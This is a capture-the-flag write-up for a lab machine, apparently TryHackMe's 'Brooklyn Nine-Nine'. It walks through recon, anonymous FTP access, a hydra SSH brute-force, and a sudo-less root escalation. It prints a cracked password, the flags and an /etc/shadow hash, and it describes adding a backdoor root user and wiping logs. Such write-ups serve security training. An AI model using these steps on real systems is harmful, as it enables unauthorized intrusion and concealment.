```bash
IP = 10.10.6.125*
Difficulty: Easy
Machine OS: Linux
Learning Platform: tryhackme.com
```

**Note: IP address may vary.*

## **Reconnaissance**

### *Scoping and Preparation*

Connect to Tryhackme OpenVPN Server using:

* ``sudo openvpn {PATH_TO_OVPN_FILE}``

Run our recon tools such as `nmap` and `gobuster`.

I ran nmap twice to get the specific ports that are open so I can do OS and Version enumeration faster since I got the open ports needed.

1st Nmap command used: `sudo nmap -T4 -p- -oN [FILENAME] [IP]`

2nd Nmap command used: `sudo nmap -A -T4 -p21,22,80 -oN [FILENAME] [IP]`

Gobuster command used: `gobuster dir -u http://[IP] -w [WORDLIST] -o [FILENAME FOR OUTPUT] -t [NUMBER OF THREADS]`

## External Enumeration

### *Preliminary Enumeration via nmap*

#### Table 1.1: nmap Results Summary

PORT | STATUS | SERVICE | VERSION
:---: | :---: | :---: | :---:
21/tcp | open | FTP | *vsftpd 3.0.3*
22/tcp | open | SSH | *OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)*
80/tcp | open | HTTP | *Apache httpd 2.4.29 ((Ubuntu))*

![Nmap Scan](../imgs/Brooklyn%20Nine-Nine/nmap.png)

Nmap scan shows that anonymous FTP login is allowed.

Ubuntu Version: [Bionic Beaver](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3)

### Web Enumeration

Enumerating the web server only gives us a static webpage as shown below.

![HTTP webserver](../imgs/Brooklyn%20Nine-Nine/webpage_port80.png)

Let's check the HTML source code if there are any developer comments.

![HTML source](../imgs/Brooklyn%20Nine-Nine/webpage_src.png)

The comment suggests that the developer used steganography on image. (*I checked the image using `steghide` and the image has embedded data which is password protected and I did not bother try cracking the password. Feel free to try cracking the password for the image.*)

Let's see what the web technologies that the web server use. In this case, I use the browser extension `wapplayzer`. [Link](https://www.wappalyzer.com/apps/)

![WebTech](../imgs/Brooklyn%20Nine-Nine/webtech.png)

## FTP Enumeration

Going through the FTP server, we found a file named `note_to_jake.txt`.

To login in FTP:

Command: `ftp [IP]`

Since `anonymous` login is allowed, we should set the login name to `anonymous` and leave the password as blank by pressing `enter` key on your keyboard. (*see image below*)

![Note to Jake](../imgs/Brooklyn%20Nine-Nine/notetojake.png)

To download the file in FTP:

Command: `get [FILENAME]`

![Download FTP file](../imgs/Brooklyn%20Nine-Nine/download_in_ftp.png)

Now, let's see the content of the text file: `note_to_jake.txt`.

![Note to Jake contents](./imgs/../../imgs/Brooklyn%20Nine-Nine/notecontents.png)

Reading the content of the text file suggests that `Jake` has weak password.

### Content Discovery

## GoBuster Scan

Let's check if `gobuster` found some directories that we can work with.

![GoBuster Scan](../imgs/Brooklyn%20Nine-Nine/gobuster_scan.png)

All of the results shown are `HTTP 403: Forbidden` error and we can safely assume that the webserver is not useful for us.

## Exploitation

We have an idea that `Jake` has weak password but there is no login page on webpage but we know that there is a `SSH` port open. We can try to bruteforce/guess the password of `Jake` using `hydra`.

### Using hydra

Steps:

1. We have username: `jake` and we need to bruteforce his password using hydra.

    Command: `hydra -l jake -P [WORDLIST] ssh://[IP] -t [NUMBER OF THREADS]`

2. Wait for `hydra` to finish.

    Results:

    ![Hydra result](../imgs/Brooklyn%20Nine-Nine/hydra_crack.png)

### Table 1.2: Credentials

Username | Password
:---: | :---:
jake | 987654321

## Post-Exploitation

### *Internal Enumeration*

#### Table 1.3: Checklist for Linux Internal Enumeration

COMMAND | DESCRIPTION
:---: | :---:
``ss -tlnp``  | lists all sockets (``-t = tcp``) (``-l = listening``) (``-n = numeric``) (``-p = processes``)
``netstat -tulnp`` | &nbsp; |  &nbsp;
``sudo -l`` | lists all binaries/files/programs the current user has ``sudo`` permissions. (might require password)
``find / -type f -user root -perm -u+s 2>/dev/null`` | finds files in ``/`` directory that has [SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) bit set. If any, consult [GTFOBins](https://gtfobins.github.io/).
``uname -a`` | prints system information (-a = all)
``whoami && id`` | prints `effective userid` (EUID) and prints `real` and `effective userid` and `groupids` (GID).
``cat /etc/crontab`` | checks for cron jobs.

*Notes: For more information about the commands look [here](https://explainshell.com)*

*Tip: When nothing else makes sense, try to use [LinPEAS](https://github.com/carlospolop/PEASS-ng) ([winPEAS](https://github.com/carlospolop/PEASS-ng) for windows machines.).*

We are now logged in as Jake!

![logged in as jake](../imgs/Brooklyn%20Nine-Nine/logged_in_as_jake.png)

Let's navigate through the `/home` directory.

![Holt's readable flag](../imgs/Brooklyn%20Nine-Nine/readable_file_in_holts_dir.png)

Looking at the permissions on `user.txt` file on `holt's` home directory, we can just read the contents of the flag!

Let's run the commands on our mini checklist above starting with `sudo -l` command and try to find privilege escalation vectors to get us to root the machine.

![passwordless less binary](../imgs/Brooklyn%20Nine-Nine/sudo_perms_on_less.png)

### *Privilege Escalation*

This privesc is very easy and we can just run:

* `sudo /usr/bin/less [FILENAME]`

Inside the file's output, type:

* `!bash`

    ![inside less](../imgs/Brooklyn%20Nine-Nine/inside_less_output.png)

* then press enter to get `root` shell.

Note: Root shell is denoted by `#` (octothorpe/hashtag/number/pound) sign.

![Rooted](../imgs/Brooklyn%20Nine-Nine/root.png)

### Data Exfiltration

We also exfiltrated the files `user.txt`, `root.txt` and the contents `/etc/shadow` file.

#### Flags

User.txt: `ee11cbb19052e40b07aac0ca060c23ee`

Root.txt: `9f0ea7bb98050796b649e85481845`

#### /etc/shadow Contents (only with encrypted passwords/and root user)

```bash
root:*:18295:0:99999:7:::
amy:$6$UKs4AX7L$8Q1ET3/4EDtczkEAde4Bkc9g4ao2v3IRbapkqtNnWaKa7a2UHbYGsAEqBPlAwXVq8LK39IRjPwmocYkkkikrR0:18399:0:99999:7:::

```

### STATUS: ROOTED

The next two steps are not necessary for completion of the machine but it completes the 5 Phases of Penetration Testing.

## Persistence

Copied the /etc/shadow file for user identification and their passwords.

Added another root user for easy access.

## Clearing Tracks

Removed all logs and footprints to to prevent risk of exposure of breach to security administrator.

## Status: Finished
